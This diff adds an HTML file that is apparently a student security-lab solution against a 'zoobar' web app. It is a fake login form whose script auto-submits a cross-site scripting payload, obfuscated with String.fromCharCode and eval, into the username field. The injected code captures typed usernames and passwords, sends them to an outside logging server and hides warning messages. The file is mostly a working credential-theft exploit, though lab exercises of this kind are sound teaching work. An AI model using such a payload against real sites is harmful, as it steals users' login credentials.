@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<title>title</title>
+		<link rel="stylesheet" href="style.css">
+		<script>
+			disguise_js = function(js_string) {
+				var base_str = "eval(String.fromCharCode(";
+				for (i in js_string) {
+					//console.log(js_string.charCodeAt(i));
+					base_str += (js_string.charCodeAt(i) + ",");
+				}
+				base_str = base_str.slice(0, -1) + "))";
+				//console.log(base_str);
+				return base_str;
+			}
+			//disguise_js("hello");
+		</script>
+	</head>
+	<body>
+<h1><a href="https://github.com/minimalcss/minimal-form">Minimal Form</a></h1>
+
+<form name=loginform method=POST action="http://zoobar/index.php">
+<table>
+<tr>
+	<td>Username:</td>
+	<td><input type=text name=login_username size=30 autocomplete=no value=''></td>
+</tr>
+<tr>
+   <td>Password:</td>
+  <td colspan=2><input type=password name=login_password size=30 autocomplete=no value="">
+  <input type=submit name=submit_login value="Log in" id="submit_button">
+  <input type=submit name=submit_registration value="Register"></td>
+</tr>
+</table>
+
+	<!--  -->
+	</body>
+	<script>
+		var attack_str = ' \
+			document.loginform.submit_login.onfocus=function() { \
+				var name = document.loginform.login_username.value; \
+				var pswd = document.loginform.login_password.value; \
+				void( (new Image()).src="http://dasak-vm-lab-server.eecs.kth.se/logger/log.php?"+"to=LabW_upg3-2_grp-94"+"&payload="+name+","+pswd+"&random=" + Math.random() ); \
+				console.log("Attack done, username and pwd are " + name + "," + pswd); \
+			}; \
+			document.loginform.login_username.value=""; \
+			var warningElements = document.querySelectorAll(".warning"); \
+			for (var i = 0; i < warningElements.length; i++) { \
+				warningElements[i].style.display = "none"; \
+			} \
+		';
+
+		document.loginform.login_username.value = "A onfocus=" + disguise_js(attack_str);
+		document.getElementById("submit_button").click();
+		
+	</script>
+</html>
+
